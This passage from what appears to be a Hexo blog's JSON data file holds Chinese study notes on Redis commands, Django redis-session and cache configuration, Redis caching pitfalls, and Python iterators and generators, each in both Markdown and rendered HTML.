key获取所有元素\n-\t删除:srem key value value2……\n\t\n\n#### 有序集合(zset)\n> 有序权重从小到大排序\n-\t定义:zadd key 权重 value 权重2 value2……,权重就是数字\n-\t获取:zrange key start stop\n-\t获取给定的权值范围元素:zrangebyscore key start stop\n-\t获取权值:zscore key value\n-\t删除指定的元素:zrem key value1 value2……\n-\t删除给定权值范围元素:zremrangebyscore key start stop\n\n\n#### Redis和python的交互:\n\n##### python基本使用\n```python\nfrom redis import *\nxx = StrictRedis(host = 'xxx', port = 6379, db = num)\n```\n> 对xx进行操作\n\n##### django中使用Redis:多数用来 存储session\n```python\npip install django-redis-sessions\n\n# setting.py中设置：\nSESSION_ENGINE = 'redis_sessions.session'\nSESSION_REDIS_HOST = 'localhost'\nSESSION_REDIS_PORT = 6379\nSESSION_REDIS_DB = 2\nSESSION_REDIS_PASSWORD = ''\nSESSION_REDIS_PREFIX = 'session'\n# 这样就可以将原本存储在django的数据库中的session存储到redis中，存储成hash\n\n# 配置成caches:\nCACHES = {\n    \"default\": {\n    \"BACKEND\": \"django_redis.cache.RedisCache\",\n    \"LOCATION\": \"redis://127.0.0.1:6379/2\",\n    \"OPTIONS\": {\n        \"CLIENT_CLASS\": \"django_redis.client.DefaultClient\",\n    }\n    }\n}\n\n# 使用\nfrom dajango_redis import get_redis_connection\nxxx = get_redis_connection('default')\n# 可以使用redis中的所有方法\n```\n\t\n\t\n\t\n### redis的问题\n>\t缓存穿透：用户查询一个数据库中一定不会有的数据，比如id=-1,因为数据库中没有这个数据，所以不会保存到缓存中，下次再来访问的时候，缓存中没有，又会去数据库中查询，这样就增加了数据库的压力，如果被黑客发现了，就会利用这个漏洞来攻击数据库，可能会让数据库崩溃，解决办法就是就算没有查到，也放到缓存中，只不过值为null，然后把过期时间设置的短一点。\n\t\n>\t缓存雪崩：意思就是大量的缓存数据同时失效（过期），这个时候，又有大并发的请求的话，就会对数据库加大访问压力，可能让数据库崩溃，解决办法就是，可以设置不同的过期时间，如果是双十一这种可以设置永不过期。\n\t\n>\t缓存击穿：意思就是用户频繁会访问的key，比如，双十一有一个活动见做一分钱领取iphone13 pro max，在非常多的人访问的时候，在这种大并发的情况下，如果缓存中的这个key过期了，那么对数据的压力就太大了，解决办法就是设置这个key用不过期。\n","slug":"redis基础","published":1,"updated":"2023-03-10T02:52:50.267Z","_id":"cld2uqf6n000r1svk5k99231s","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h2><h3 id=\"NoSQL一种新出现的数据库-not-only-sql\"><a href=\"#NoSQL一种新出现的数据库-not-only-sql\" class=\"headerlink\" title=\"NoSQL一种新出现的数据库(not only sql)\"></a>NoSQL一种新出现的数据库(not only sql)</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">1、不认识sql语句\n2、存储结构和关系型数据库中的关系表完全不同，nosql存储的数据都是kv（key-value）形式\n3、nosql的世界没有一种通用的语言，每一种nosql数据库都有自己的api和语法，以及应用场景\n4、nosql的产品种类多\n\n### Redis数据库\n1、支持数据的持久化\n2、支持简单的key-vlaue，还有list,set,zset,hash等类型\n3、支持备份，master-slave模式的数据备份<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"Redis数据类型\"><a href=\"#Redis数据类型\" class=\"headerlink\" title=\"Redis数据类型\"></a>Redis数据类型</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">1、字符串string\n2、哈希hash\n3、列表list\n4、集合set\n5、有序集合zset<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h3 id=\"Redis操作行为\"><a href=\"#Redis操作行为\" class=\"headerlink\" title=\"Redis操作行为\"></a>Redis操作行为</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、保存\n2、修改\n3、获取\n4、删除<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"string类型\"><a href=\"#string类型\" class=\"headerlink\" title=\"string类型\"></a>string类型</h4><blockquote>\n<p>redis中最基础的数据类型，是二进制安全的，可以接受任何格式的数据，照片、json等</p>\n</blockquote>\n<ul>\n<li>   定义字符串:set key value,  setex key sconds value 这种方式设置过期时间，  mset key value key value设置多个</li>\n<li>   查看字符串:get key，mget key1 key2,获取多个</li>\n<li>   字符串的追加:append key value</li>\n<li>   查看所有的键:keys 通配符</li>\n<li>   查看键是否存在:exists key</li>\n<li>   查看键值的类型:type key</li>\n<li>   设置过期时间:expire key sconds</li>\n<li>   查看键的有效时间:ttl key</li>\n<li>   删除:del key1 key2……</li>\n</ul>\n<h4 id=\"hash类型\"><a href=\"#hash类型\" class=\"headerlink\" title=\"hash类型\"></a>hash类型</h4><blockquote>\n<p>hash本来就有key，hash的value就是一个字符串string，所以还有一个string的key</p>\n</blockquote>\n<ul>\n<li>   定义哈希类型:hset key string-key value，  hmset key string-key1 value1 string-key2 value2一次设置多个，一个hash中可以有多个value</li>\n<li>   查看指定键的值：hkey key</li>\n<li>   获取hash的值:hget key string-key,   hmget key string-key1 string-key2……多个值，  hvals key获取所有的值</li>\n<li>   删除:del key，删除整个hash，hdel key string-key删除对应的hash值</li>\n</ul>\n<h4 id=\"列表类型（list）\"><a href=\"#列表类型（list）\" class=\"headerlink\" title=\"列表类型（list）\"></a>列表类型（list）</h4><ul>\n<li>   定义：lpush key value vlaue2……从左侧插入，rpush key value value2…… 从右侧插入，linsert key before或者after 某一个已经存在的value value value2……</li>\n<li>   获取:lrange key start stop</li>\n<li>   修改:lset key index new_value</li>\n<li>   删除:lrem key count value,count是一个数字，表示删除多少个（相同元素），整数表示前往后，负数从后往前，为0的时候表示删除所有给定的value</li>\n</ul>\n<h4 id=\"集合类型-set\"><a href=\"#集合类型-set\" class=\"headerlink\" title=\"集合类型(set)\"></a>集合类型(set)</h4><blockquote>\n<p>不能重复，无序</p>\n</blockquote>\n<ul>\n<li>   定义:sadd key value value2……</li>\n<li>   获取:smenbers key获取所有元素</li>\n<li> 删除:srem key value value2……</li>\n</ul>\n<h4 id=\"有序集合-zset\"><a href=\"#有序集合-zset\" class=\"headerlink\" title=\"有序集合(zset)\"></a>有序集合(zset)</h4><blockquote>\n<p>有序权重从小到大排序</p>\n</blockquote>\n<ul>\n<li>   定义:zadd key 权重 value 权重2 value2……,权重就是数字</li>\n<li>   获取:zrange key start stop</li>\n<li>   获取给定的权值范围元素:zrangebyscore key start stop</li>\n<li>   获取权值:zscore key value</li>\n<li>   删除指定的元素:zrem key value1 value2……</li>\n<li>   删除给定权值范围元素:zremrangebyscore key start stop</li>\n</ul>\n<h4 id=\"Redis和python的交互\"><a href=\"#Redis和python的交互\" class=\"headerlink\" title=\"Redis和python的交互:\"></a>Redis和python的交互:</h4><h5 id=\"python基本使用\"><a href=\"#python基本使用\" class=\"headerlink\" title=\"python基本使用\"></a>python基本使用</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> redis <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nxx <span class=\"token operator\">=</span> StrictRedis<span class=\"token punctuation\">(</span>host <span class=\"token operator\">=</span> <span class=\"token string\">'xxx'</span><span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token number\">6379</span><span class=\"token punctuation\">,</span> db <span class=\"token operator\">=</span> num<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<blockquote>\n<p>对xx进行操作</p>\n</blockquote>\n<h5 id=\"django中使用Redis-多数用来-存储session\"><a href=\"#django中使用Redis-多数用来-存储session\" class=\"headerlink\" title=\"django中使用Redis:多数用来 存储session\"></a>django中使用Redis:多数用来 存储session</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">pip install django<span class=\"token operator\">-</span>redis<span class=\"token operator\">-</span>sessions\n\n<span class=\"token comment\"># setting.py中设置：</span>\nSESSION_ENGINE <span class=\"token operator\">=</span> <span class=\"token string\">'redis_sessions.session'</span>\nSESSION_REDIS_HOST <span class=\"token operator\">=</span> <span class=\"token string\">'localhost'</span>\nSESSION_REDIS_PORT <span class=\"token operator\">=</span> <span class=\"token number\">6379</span>\nSESSION_REDIS_DB <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nSESSION_REDIS_PASSWORD <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\nSESSION_REDIS_PREFIX <span class=\"token operator\">=</span> <span class=\"token string\">'session'</span>\n<span class=\"token comment\"># 这样就可以将原本存储在django的数据库中的session存储到redis中，存储成hash</span>\n\n<span class=\"token comment\"># 配置成caches:</span>\nCACHES <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"default\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"BACKEND\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"django_redis.cache.RedisCache\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"LOCATION\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"redis://127.0.0.1:6379/2\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"OPTIONS\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">\"CLIENT_CLASS\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"django_redis.client.DefaultClient\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\"># 使用</span>\n<span class=\"token keyword\">from</span> dajango_redis <span class=\"token keyword\">import</span> get_redis_connection\nxxx <span class=\"token operator\">=</span> get_redis_connection<span class=\"token punctuation\">(</span><span class=\"token string\">'default'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 可以使用redis中的所有方法</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"redis的问题\"><a href=\"#redis的问题\" class=\"headerlink\" title=\"redis的问题\"></a>redis的问题</h3><blockquote>\n<p>   缓存穿透：用户查询一个数据库中一定不会有的数据，比如id=-1,因为数据库中没有这个数据，所以不会保存到缓存中，下次再来访问的时候，缓存中没有，又会去数据库中查询，这样就增加了数据库的压力，如果被黑客发现了，就会利用这个漏洞来攻击数据库，可能会让数据库崩溃，解决办法就是就算没有查到，也放到缓存中，只不过值为null，然后把过期时间设置的短一点。</p>\n</blockquote>\n<blockquote>\n<p>   缓存雪崩：意思就是大量的缓存数据同时失效（过期），这个时候，又有大并发的请求的话，就会对数据库加大访问压力，可能让数据库崩溃，解决办法就是，可以设置不同的过期时间，如果是双十一这种可以设置永不过期。</p>\n</blockquote>\n<blockquote>\n<p>   缓存击穿：意思就是用户频繁会访问的key，比如，双十一有一个活动见做一分钱领取iphone13 pro max，在非常多的人访问的时候，在这种大并发的情况下，如果缓存中的这个key过期了，那么对数据的压力就太大了，解决办法就是设置这个key用不过期。</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h2><h3 id=\"NoSQL一种新出现的数据库-not-only-sql\"><a href=\"#NoSQL一种新出现的数据库-not-only-sql\" class=\"headerlink\" title=\"NoSQL一种新出现的数据库(not only sql)\"></a>NoSQL一种新出现的数据库(not only sql)</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">1、不认识sql语句\n2、存储结构和关系型数据库中的关系表完全不同，nosql存储的数据都是kv（key-value）形式\n3、nosql的世界没有一种通用的语言，每一种nosql数据库都有自己的api和语法，以及应用场景\n4、nosql的产品种类多\n\n### Redis数据库\n1、支持数据的持久化\n2、支持简单的key-vlaue，还有list,set,zset,hash等类型\n3、支持备份，master-slave模式的数据备份<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"Redis数据类型\"><a href=\"#Redis数据类型\" class=\"headerlink\" title=\"Redis数据类型\"></a>Redis数据类型</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">1、字符串string\n2、哈希hash\n3、列表list\n4、集合set\n5、有序集合zset<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h3 id=\"Redis操作行为\"><a href=\"#Redis操作行为\" class=\"headerlink\" title=\"Redis操作行为\"></a>Redis操作行为</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、保存\n2、修改\n3、获取\n4、删除<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"string类型\"><a href=\"#string类型\" class=\"headerlink\" title=\"string类型\"></a>string类型</h4><blockquote>\n<p>redis中最基础的数据类型，是二进制安全的，可以接受任何格式的数据，照片、json等</p>\n</blockquote>\n<ul>\n<li>   定义字符串:set key value,  setex key sconds value 这种方式设置过期时间，  mset key value key value设置多个</li>\n<li>   查看字符串:get key，mget key1 key2,获取多个</li>\n<li>   字符串的追加:append key value</li>\n<li>   查看所有的键:keys 通配符</li>\n<li>   查看键是否存在:exists key</li>\n<li>   查看键值的类型:type key</li>\n<li>   设置过期时间:expire key sconds</li>\n<li>   查看键的有效时间:ttl key</li>\n<li>   删除:del key1 key2……</li>\n</ul>\n<h4 id=\"hash类型\"><a href=\"#hash类型\" class=\"headerlink\" title=\"hash类型\"></a>hash类型</h4><blockquote>\n<p>hash本来就有key，hash的value就是一个字符串string，所以还有一个string的key</p>\n</blockquote>\n<ul>\n<li>   定义哈希类型:hset key string-key value，  hmset key string-key1 value1 string-key2 value2一次设置多个，一个hash中可以有多个value</li>\n<li>   查看指定键的值：hkey key</li>\n<li>   获取hash的值:hget key string-key,   hmget key string-key1 string-key2……多个值，  hvals key获取所有的值</li>\n<li>   删除:del key，删除整个hash，hdel key string-key删除对应的hash值</li>\n</ul>\n<h4 id=\"列表类型（list）\"><a href=\"#列表类型（list）\" class=\"headerlink\" title=\"列表类型（list）\"></a>列表类型（list）</h4><ul>\n<li>   定义：lpush key value vlaue2……从左侧插入，rpush key value value2…… 从右侧插入，linsert key before或者after 某一个已经存在的value value value2……</li>\n<li>   获取:lrange key start stop</li>\n<li>   修改:lset key index new_value</li>\n<li>   删除:lrem key count value,count是一个数字，表示删除多少个（相同元素），整数表示前往后，负数从后往前，为0的时候表示删除所有给定的value</li>\n</ul>\n<h4 id=\"集合类型-set\"><a href=\"#集合类型-set\" class=\"headerlink\" title=\"集合类型(set)\"></a>集合类型(set)</h4><blockquote>\n<p>不能重复，无序</p>\n</blockquote>\n<ul>\n<li>   定义:sadd key value value2……</li>\n<li>   获取:smenbers key获取所有元素</li>\n<li> 删除:srem key value value2……</li>\n</ul>\n<h4 id=\"有序集合-zset\"><a href=\"#有序集合-zset\" class=\"headerlink\" title=\"有序集合(zset)\"></a>有序集合(zset)</h4><blockquote>\n<p>有序权重从小到大排序</p>\n</blockquote>\n<ul>\n<li>   定义:zadd key 权重 value 权重2 value2……,权重就是数字</li>\n<li>   获取:zrange key start stop</li>\n<li>   获取给定的权值范围元素:zrangebyscore key start stop</li>\n<li>   获取权值:zscore key value</li>\n<li>   删除指定的元素:zrem key value1 value2……</li>\n<li>   删除给定权值范围元素:zremrangebyscore key start stop</li>\n</ul>\n<h4 id=\"Redis和python的交互\"><a href=\"#Redis和python的交互\" class=\"headerlink\" title=\"Redis和python的交互:\"></a>Redis和python的交互:</h4><h5 id=\"python基本使用\"><a href=\"#python基本使用\" class=\"headerlink\" title=\"python基本使用\"></a>python基本使用</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> redis <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nxx <span class=\"token operator\">=</span> StrictRedis<span class=\"token punctuation\">(</span>host <span class=\"token operator\">=</span> <span class=\"token string\">'xxx'</span><span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token number\">6379</span><span class=\"token punctuation\">,</span> db <span class=\"token operator\">=</span> num<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<blockquote>\n<p>对xx进行操作</p>\n</blockquote>\n<h5 id=\"django中使用Redis-多数用来-存储session\"><a href=\"#django中使用Redis-多数用来-存储session\" class=\"headerlink\" title=\"django中使用Redis:多数用来 存储session\"></a>django中使用Redis:多数用来 存储session</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">pip install django<span class=\"token operator\">-</span>redis<span class=\"token operator\">-</span>sessions\n\n<span class=\"token comment\"># setting.py中设置：</span>\nSESSION_ENGINE <span class=\"token operator\">=</span> <span class=\"token string\">'redis_sessions.session'</span>\nSESSION_REDIS_HOST <span class=\"token operator\">=</span> <span class=\"token string\">'localhost'</span>\nSESSION_REDIS_PORT <span class=\"token operator\">=</span> <span class=\"token number\">6379</span>\nSESSION_REDIS_DB <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nSESSION_REDIS_PASSWORD <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\nSESSION_REDIS_PREFIX <span class=\"token operator\">=</span> <span class=\"token string\">'session'</span>\n<span class=\"token comment\"># 这样就可以将原本存储在django的数据库中的session存储到redis中，存储成hash</span>\n\n<span class=\"token comment\"># 配置成caches:</span>\nCACHES <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"default\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"BACKEND\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"django_redis.cache.RedisCache\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"LOCATION\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"redis://127.0.0.1:6379/2\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"OPTIONS\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">\"CLIENT_CLASS\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"django_redis.client.DefaultClient\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\"># 使用</span>\n<span class=\"token keyword\">from</span> dajango_redis <span class=\"token keyword\">import</span> get_redis_connection\nxxx <span class=\"token operator\">=</span> get_redis_connection<span class=\"token punctuation\">(</span><span class=\"token string\">'default'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 可以使用redis中的所有方法</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"redis的问题\"><a href=\"#redis的问题\" class=\"headerlink\" title=\"redis的问题\"></a>redis的问题</h3><blockquote>\n<p>   缓存穿透：用户查询一个数据库中一定不会有的数据，比如id=-1,因为数据库中没有这个数据，所以不会保存到缓存中，下次再来访问的时候，缓存中没有，又会去数据库中查询，这样就增加了数据库的压力，如果被黑客发现了，就会利用这个漏洞来攻击数据库，可能会让数据库崩溃，解决办法就是就算没有查到，也放到缓存中，只不过值为null，然后把过期时间设置的短一点。</p>\n</blockquote>\n<blockquote>\n<p>   缓存雪崩：意思就是大量的缓存数据同时失效（过期），这个时候，又有大并发的请求的话，就会对数据库加大访问压力，可能让数据库崩溃，解决办法就是，可以设置不同的过期时间，如果是双十一这种可以设置永不过期。</p>\n</blockquote>\n<blockquote>\n<p>   缓存击穿：意思就是用户频繁会访问的key，比如，双十一有一个活动见做一分钱领取iphone13 pro max，在非常多的人访问的时候，在这种大并发的情况下，如果缓存中的这个key过期了，那么对数据的压力就太大了，解决办法就是设置这个key用不过期。</p>\n</blockquote>\n"},{"title":"迭代器","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T06:08:40.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"python迭代器","_content":"## 迭代器\n> 可以一个一个的取，取一个用一个，迭代器会主动暂停\n\n> - 1、from collections import Iterator,这个类可以判断某个对象是不是迭代器\n\n> - 2、from collections import Iterable,这个类可以判断某个对象可不可以迭代，最主要的是它可以产生迭代器,如果要用Iterable来创建一个迭代器，那么必须使用__iter__方法和__next__方法，且两个方法是共生的，有了iter就一定有next，通过next来迭代，通过iter让对象可以迭代，这个对象多指不规律的，定义成一个类的,next的返回值用户要用for循环来遍历，next就是一个迭代的规则\n\n> - 3、可以一个一个的取，取一个用一个:方法\n\n```python\nprint(f.__next__()) # 取第一个\nprint(f.__next__()) # 取第二个\nprint(f.__next__()) # 取第三\n ```\n\n## 生成器\n> 可以用一个拿一个，不用就不管，生成器会自动暂停\n\n\n> -    1、生成器是一个特殊的迭代器，并且不需要导入任何的包，用了yield X的函数就是生成器，也就是说如果函数里面出现了yield，那么这个函数就不再是函数，而是一个生成器调用的时候，也是创建的生成器对象，\n> -    2、生成器不会存储数据，而只是用来产生数据的，多就用多久拿出来使用，大大节省了存储空间\n> -    3、生成器的启动方法:\n\n```python\n1、re = next(obj) # 这样就会返回生成器中yield后面的值，也就是说re = yield后面的变量\n2、re = send(\"传递的参数\") # 传递的参数\"就是给”yield x\"整体赋值\n```\n> -    4、可以用一个拿一个，不用就不管\n  \n```python\nre = next(obj)\nprint(re)\nre = next(obj)\nprint(re)\nre = next(obj)\nprint(re)\nre = next(obj)\nprint(re)\nre = obj.send(\"hahah\")\nprint(re)\n ```","source":"_posts/迭代器.md","raw":"---\ntitle: 迭代器\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 14:08:40\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: python迭代器\ntags: basic\ncategories: Python\n---\n## 迭代器\n> 可以一个一个的取，取一个用一个，迭代器会主动暂停\n\n> - 1、from collections import Iterator,这个类可以判断某个对象是不是迭代器\n\n> - 2、from collections import Iterable,这个类可以判断某个对象可不可以迭代，最主要的是它可以产生迭代器,如果要用Iterable来创建一个迭代器，那么必须使用__iter__方法和__next__方法，且两个方法是共生的，有了iter就一定有next，通过next来迭代，通过iter让对象可以迭代，这个对象多指不规律的，定义成一个类的,next的返回值用户要用for循环来遍历，next就是一个迭代的规则\n\n> - 3、可以一个一个的取，取一个用一个:方法\n\n```python\nprint(f.__next__()) # 取第一个\nprint(f.__next__()) # 取第二个\nprint(f.__next__()) # 取第三\n ```\n\n## 生成器\n> 可以用一个拿一个，不用就不管，生成器会自动暂停\n\n\n> -    1、生成器是一个特殊的迭代器，并且不需要导入任何的包，用了yield X的函数就是生成器，也就是说如果函数里面出现了yield，那么这个函数就不再是函数，而是一个生成器调用的时候，也是创建的生成器对象，\n> -    2、生成器不会存储数据，而只是用来产生数据的，多就用多久拿出来使用，大大节省了存储空间\n> -    3、生成器的启动方法:\n\n```python\n1、re = next(obj) # 这样就会返回生成器中yield后面的值，也就是说re = yield后面的变量\n2、re = send(\"传递的参数\") # 传递的参数\"就是给”yield x\"整体赋值\n```\n> -    4、可以用一个拿一个，不用就不管\n  \n```python\nre = next(obj)\nprint(re)\nre = next(obj)\nprint(re)\nre = next(obj)\nprint(re)\nre = next(obj)\nprint(re)\nre = obj.send(\"hahah\")\nprint(re)\n ```","slug":"迭代器","published":1,"updated":"2023-03-10T02:50:50.215Z","_id":"cld2uqf6o000u1svkfys8d4fe","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"迭代器\"><a href=\"#迭代器\" class=\"headerlink\" title=\"迭代器\"></a>迭代器</h2><blockquote>\n<p>可以一个一个的取，取一个用一个，迭代器会主动暂停</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>1、from collections import Iterator,这个类可以判断某个对象是不是迭代器</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>2、from collections import Iterable,这个类可以判断某个对象可不可以迭代，最主要的是它可以产生迭代器,如果要用Iterable来创建一个迭代器，那么必须使用__iter__方法和__next__方法，且两个方法是共生的，有了iter就一定有next，通过next来迭代，通过iter让对象可以迭代，这个对象多指不规律的，定义成一个类的,next的返回值用户要用for循环来遍历，next就是一个迭代的规则</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>3、可以一个一个的取，取一个用一个:方法</li>\n</ul>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>__next__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 取第一个</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>__next__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 取第二个</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>__next__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 取第三</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"生成器\"><a href=\"#生成器\" class=\"headerlink\" title=\"生成器\"></a>生成器</h2><blockquote>\n<p>可以用一个拿一个，不用就不管，生成器会自动暂停</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>   1、生成器是一个特殊的迭代器，并且不需要导入任何的包，用了yield X的函数就是生成器，也就是说如果函数里面出现了yield，那么这个函数就不再是函数，而是一个生成器调用的时候，也是创建的生成器对象，</li>\n<li>   2、生成器不会存储数据，而只是用来产生数据的，多就用多久拿出来使用，大大节省了存储空间</li>\n<li>   3、生成器的启动方法:</li>\n</ul>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token number\">1</span>、re <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 这样就会返回生成器中yield后面的值，也就是说re = yield后面的变量</span>\n<span class=\"token number\">2</span>、re <span class=\"token operator\">=</span> send<span class=\"token punctuation\">(</span><span class=\"token string\">\"传递的参数\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 传递的参数\"就是给”yield x\"整体赋值</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<blockquote>\n<ul>\n<li>   4、可以用一个拿一个，不用就不管</li>\n</ul>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">re <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span>\nre <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span>\nre <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span>\nre <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span>\nre <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">\"hahah\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"迭代器\"><a href=\"#迭代器\" class=\"headerlink\" title=\"迭代器\"></a>迭代器</h2><blockquote>\n<p>可以一个一个的取，取一个用一个，迭代器会主动暂停</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>1、from collections import Iterator,这个类可以判断某个对象是不是迭代器</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>2、from collections import 